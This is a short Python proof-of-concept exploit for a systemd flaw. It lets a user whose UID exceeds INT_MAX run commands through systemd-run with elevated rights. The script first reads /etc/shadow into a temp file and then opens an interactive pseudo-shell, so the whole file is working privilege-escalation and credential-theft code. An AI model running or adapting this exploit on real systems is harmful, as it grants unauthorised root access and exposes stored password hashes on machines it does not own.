#!/usr/bin/env python

"""
This PoC code is meant to be run as the user with a UID over INT_MAX.

During the run it will drop you into a sort of shell and allow you to run commands as the user,
you can pretty much do whatever you want once in the shell.
"""

import os
import time
import string
import shlex
import random
import subprocess


COMMAND_TEMPLATE = "systemd-run bash -c '{} > {}'"


def results_filename(path="/tmp", length=7):
    retval = []
    for _ in range(length):
        retval.append(random.choice(string.ascii_letters))
    return "{}/{}.txt".format(path, ''.join(retval))


def read_results_file(path):
    with open(path) as data:
        return data.read()


def send_command(command, res_file):
    return subprocess.call(shlex.split(COMMAND_TEMPLATE.format(command, res_file)))


def create_shell_interpreter():
    while True:
        command = raw_input("> ")
        res_file_name = results_filename()
        print("-" * 30)
        send_command(command, res_file_name)
        time.sleep(3)
        print("\n>> {}".format(open(res_file_name).read()))
        print("-" * 30)
        time.sleep(3)
        try:
            os.remove(res_file_name)
        except:
            print("issue cleaning: {}".format(res_file_name))


def main():
    try:
        print("-" * 30)
        results_file = results_filename()
        command = "cat /etc/shadow"
        send_command(command, results_file)
        print("-" * 30)
        create_shell_interpreter()
    except KeyboardInterrupt:
        print("user quit...")
    except Exception as e:
        print("error: {}".format(e))


if __name__ == "__main__":
    main()